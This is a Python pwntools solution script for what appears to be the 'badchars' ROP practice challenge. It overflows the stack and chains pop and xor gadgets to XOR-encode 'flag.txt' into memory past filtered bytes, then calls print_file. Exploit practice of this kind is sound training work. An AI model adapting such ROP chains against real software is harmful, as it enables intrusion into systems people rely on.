from pwn import *

context.log_level = "debug"

r = process("./badchars")
exe = ELF("./badchars")
write_addr = exe.bss(0)

# Useful gadgets:
# 0x00000000004006a3: pop rdi; ret;
# 0x00000000004004ee: ret;
# 0x0000000000400628: xor byte ptr [r15], r14b; ret;
# 0x00000000004006a0: pop r14; pop r15; ret;

pop_rdi = p64(0x4006A3)
xor_r15 = p64(0x400628)
pop_r14_p15 = p64(0x4006A0)
ret = p64(0x4004EE)

payload = b"A" * 0x28 + ret
# 0x28 is the offset to return address, return instruction is called to align the stack before the function call

for i, v in enumerate("flag.txt"):
    gadget = b""
    if v not in "xga.":
        # The forbidden bytes: 0x78, 0x67, 0x61, 0x2e
        gadget += pop_r14_p15 + p64(ord(v)) + p64(write_addr + i) + xor_r15
    else:
        gadget += pop_r14_p15 + p64(ord(v) ^ 0xDE) + p64(write_addr + i) + xor_r15
        gadget += pop_r14_p15 + p64(0xDE) + p64(write_addr + i) + xor_r15
    payload += gadget

payload += pop_rdi + p64(write_addr) + p64(exe.plt["print_file"])
r.recvuntil(b"> ")
r.send(payload)
r.interactive()
